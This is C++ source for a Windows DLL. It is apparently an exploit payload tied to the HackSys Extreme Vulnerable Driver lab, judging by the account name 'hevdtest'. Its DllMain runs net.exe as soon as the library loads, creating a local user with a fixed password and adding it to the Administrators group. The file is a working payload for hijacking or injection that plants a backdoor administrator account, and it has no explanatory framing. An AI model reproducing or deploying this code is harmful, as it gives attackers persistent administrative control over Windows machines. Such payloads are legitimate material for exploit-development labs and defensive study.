#include "pch.h"

extern "C" {
    __declspec(dllexport) BOOL ExecuteCommand(wchar_t cmd[])
    {
        wchar_t currentDirectory[] = L"C:\\Windows\\System32";
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        BOOL status = ::CreateProcess(
            NULL,
            cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_NEW_CONSOLE,
            NULL,
            currentDirectory,
            &si,
            &pi);

        if (status)
        {
            ::WaitForSingleObject(pi.hProcess, -1);
            ::CloseHandle(pi.hProcess);
            ::CloseHandle(pi.hThread);
        }

        return status;
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  dwReason,
    LPVOID lpReserved
) {
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        wchar_t adduser[] = L"C:\\Windows\\System32\\net.exe user hevdtest Password123! /add";
        wchar_t addgroup[] = L"C:\\Windows\\System32\\net.exe localgroup Administrators hevdtest /add";
        ExecuteCommand(adduser);
        ExecuteCommand(addgroup);
    }
    return TRUE;
}
